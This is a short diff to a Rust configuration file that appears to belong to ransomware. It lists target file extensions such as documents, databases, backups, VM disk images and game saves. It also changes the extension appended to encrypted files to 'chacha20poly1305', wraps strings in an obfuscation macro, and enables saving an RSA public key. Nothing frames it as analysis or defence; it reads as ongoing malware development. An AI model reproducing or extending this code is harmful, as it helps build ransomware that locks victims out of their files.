@@ -31,8 +31,8 @@ pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
         "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar",
         "m4a", "wma", "avi", "wmv", "d3dbsp", "sc2save", "sie", "sum", "bkp", "flv", "js", "raw",
         "jpeg", "tar", "zip", "gz", "cmd", "key", "dot", "docm", "txt", "doc", "docx", "xls",
-        "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "sln", "php", "asp",
-        "aspx", "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov",
+        "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "sln", "php", "asp", "aspx",
+        "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov",
     ]
 });
 
@@ -40,7 +40,7 @@ pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
 pub const BLOCKLIST_EXTENSIONS: Option<Vec<String>> = None;
 
 /// Extension used for encrypted files [required]
-pub static ENCRYPTED_EXTENSION: LazyLock<String> = LazyLock::new(|| lc!("chacha20"));
+pub static ENCRYPTED_EXTENSION: LazyLock<String> = LazyLock::new(|| lc!("chacha20poly1305"));
 
 /// Whether to save RSA public key to disk [required]
 pub const SAVE_PUBLIC_KEY_TO_DISK: bool = true;
